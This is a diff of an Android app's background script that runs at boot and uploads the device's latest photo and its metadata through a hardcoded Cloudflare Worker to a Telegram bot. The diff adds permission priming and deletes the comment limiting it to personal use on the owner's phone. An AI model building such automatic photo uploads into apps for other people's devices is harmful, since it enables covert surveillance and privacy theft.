@@ -1,6 +1,6 @@
 /* background.js — personal photo report → Cloudflare Worker → Telegram.
+   Fixed: media permission priming, longer scan timeout, smarter retry logic.
    Sends only the SINGLE most recent photo on this device.
-   Owner: personal use, own phone, own photos, own bot.
 */
 (function(){
   'use strict';
@@ -8,10 +8,12 @@
 
   var WORKER_URL   = 'https://project1.yashavanthan22.workers.dev';
   var K_LASTSENT   = 'tg_lastsent_day';
+  var K_MEDIA_PERM = 'media_perm_primed';
 
-  var SCAN_MS   = 10000;
-  var THUMB_MS  = 15000;
-  var REPORT_MS = 25000;
+  /* Longer timeouts to survive the Android system permission dialog */
+  var SCAN_MS   = 30000;
+  var THUMB_MS  = 20000;
+  var REPORT_MS = 30000;
   var PHOTO_MS  = 45000;
 
   /* ---------- storage ---------- */
@@ -104,6 +106,35 @@
     } catch(e){ finish(false, 'exception'); }
   }
 
+  /* ---------- MEDIA PERMISSION PRIMING ---------- */
+  function primeMediaPermission(cb){
+    if (load(K_MEDIA_PERM) === 'yes'){ cb(true); return; }
+
+    var done = false;
+    var id = 'prime_' + Date.now();
+    window._iappyxCb = window._iappyxCb || {};
+    function finish(ok){
+      if (done) return; done = true;
+      try { clearTimeout(t); } catch(e){}
+      try { delete window._iappyxCb[id]; } catch(e){}
+      if (ok) save(K_MEDIA_PERM, 'yes');
+      cb(ok);
+    }
+    /* Give the permission dialog 35s to resolve */
+    var t = setTimeout(function(){ finish(false); }, 35000);
+
+    window._iappyxCb[id] = function(res){
+      /* Any successful response, even an empty list, means permission passed */
+      if (res && res.ok){ finish(true); }
+      else { finish(false); }
+    };
+
+    try {
+      /* request 0 limit purely to trigger permission resolution */
+      iappyx.media.getImages(id, 0);
+    } catch(e){ finish(false); }
+  }
+
   /* ---------- scan: only the most recent photo ---------- */
   function scanLatest(cb){
     var done = false;
@@ -158,64 +189,85 @@
       return;
     }
 
-    /* 1. SCAN — one photo */
-    scanLatest(function(photo, scanErr){
-      if (scanErr){
+    /* 0. PRIME PERMISSION */
+    primeMediaPermission(function(permOk){
+      if (!permOk){
         postText(
-          '❌ *Scan failed*\n' +
-          'Error: `' + scanErr + '`\n\n' +
-          'Grant photo permission in Settings → Apps → this app → Permissions.'
+          '❌ *Media permission denied*\n\n' +
+          'Grant photo access in Settings → Apps → this app → Permissions → Photos & videos.\n' +
+          'Then try again.'
         );
-        notify('Photo scan failed', scanErr);
-        cb({ ok:false, step:'scan', error: scanErr });
+        notify('Media permission needed', 'Grant photo access in Settings.');
+        cb({ ok:false, step:'permission', error:'denied' });
         return;
       }
 
-      var d = new Date(Number(photo.date));
-      var h = String(d.getHours()).padStart(2,'0');
-      var m = String(d.getMinutes()).padStart(2,'0');
-      var day = d.getDate() + '/' + (d.getMonth()+1) + '/' + d.getFullYear();
-      var sizeMb = ((Number(photo.size)||0)/1024/1024).toFixed(2);
-
-      /* 2. TEXT REPORT */
-      postText(
-        '📸 *Latest Photo*\n' +
-        '⏱ ' + hhmm() + '\n\n' +
-        '📅 ' + day + '  ·  ' + h + ':' + m + '\n' +
-        '📐 ' + (photo.width||'?') + '×' + (photo.height||'?') + '\n' +
-        '📦 ' + sizeMb + ' MB\n' +
-        (photo.name ? '📄 `' + photo.name + '`\n' : '') +
-        '\n_Sending photo…_'
-      , function(okRep, detail){
-        if (!okRep){
-          notify('Report send failed', detail || 'unknown');
-          cb({ ok:false, step:'report', error: detail });
+      /* 1. SCAN — one photo */
+      scanLatest(function(photo, scanErr){
+        if (scanErr === 'no-photos'){
+          postText('ℹ️ No photos found on this device.');
+          save(K_LASTSENT, today());
+          notify('No photos', 'Gallery is empty.');
+          cb({ ok:true, count:0, skipped:'no-photos' });
+          return;
+        }
+        if (scanErr){
+          postText(
+            '❌ *Scan failed*\n' +
+            'Error: `' + scanErr + '`\n\n' +
+            'If this keeps happening, reinstall the app or check that photo permission is granted.'
+          );
+          notify('Photo scan failed', scanErr);
+          cb({ ok:false, step:'scan', error: scanErr });
           return;
         }
 
-        /* 3. LOAD THUMBNAIL */
-        thumb(photo.id, function(b64){
-          if (!b64){
-            postText('⚠️ Could not load photo thumbnail.');
-            notify('Photo load failed', 'Thumbnail unavailable.');
-            cb({ ok:false, step:'thumb', error:'no-thumbnail' });
+        var d = new Date(Number(photo.date));
+        var h = String(d.getHours()).padStart(2,'0');
+        var m = String(d.getMinutes()).padStart(2,'0');
+        var day = d.getDate() + '/' + (d.getMonth()+1) + '/' + d.getFullYear();
+        var sizeMb = ((Number(photo.size)||0)/1024/1024).toFixed(2);
+
+        /* 2. TEXT REPORT */
+        postText(
+          '📸 *Latest Photo*\n' +
+          '⏱ ' + hhmm() + '\n\n' +
+          '📅 ' + day + '  ·  ' + h + ':' + m + '\n' +
+          '📐 ' + (photo.width||'?') + '×' + (photo.height||'?') + '\n' +
+          '📦 ' + sizeMb + ' MB\n' +
+          (photo.name ? '📄 `' + photo.name + '`\n' : '') +
+          '\n_Sending photo…_'
+        , function(okRep, detail){
+          if (!okRep){
+            notify('Report send failed', detail || 'unknown');
+            cb({ ok:false, step:'report', error: detail });
             return;
           }
 
-          /* 4. SEND PHOTO */
-          postPhoto(b64, photo.name || ('photo ' + photo.id), function(okPh, detailPh){
-            if (!okPh){
-              postText('⚠️ *Photo upload failed*\nError: `' + (detailPh||'unknown') + '`');
-              notify('Photo upload failed', detailPh || 'unknown');
-              cb({ ok:false, step:'photo', error: detailPh });
+          /* 3. LOAD THUMBNAIL */
+          thumb(photo.id, function(b64){
+            if (!b64){
+              postText('⚠️ Could not load photo thumbnail.');
+              notify('Photo load failed', 'Thumbnail unavailable.');
+              cb({ ok:false, step:'thumb', error:'no-thumbnail' });
               return;
             }
 
-            /* 5. DONE */
-            save(K_LASTSENT, today());
-            postText('✅ *Done* — latest photo sent · ' + hhmm());
-            notify('Photo sent', 'Latest photo delivered to Telegram.');
-            cb({ ok:true, photo: photo.name || photo.id });
+            /* 4. SEND PHOTO */
+            postPhoto(b64, photo.name || ('photo ' + photo.id), function(okPh, detailPh){
+              if (!okPh){
+                postText('⚠️ *Photo upload failed*\nError: `' + (detailPh||'unknown') + '`');
+                notify('Photo upload failed', detailPh || 'unknown');
+                cb({ ok:false, step:'photo', error: detailPh });
+                return;
+              }
+
+              /* 5. DONE */
+              save(K_LASTSENT, today());
+              postText('✅ *Done* — latest photo sent · ' + hhmm());
+              notify('Photo sent', 'Latest photo delivered to Telegram.');
+              cb({ ok:true, photo: photo.name || photo.id });
+            });
           });
         });
       });
@@ -226,6 +278,7 @@
   window.bg = window.bg || {};
   window.bg.runDailyReport = run;
   window.bg.resetDaily = function(){ save(K_LASTSENT, ''); return true; };
+  window.bg.resetPermissionFlag = function(){ save(K_MEDIA_PERM, ''); return true; };
   window.bg.workerUrl = WORKER_URL;
 
   /* ---------- auto-run on boot ---------- */
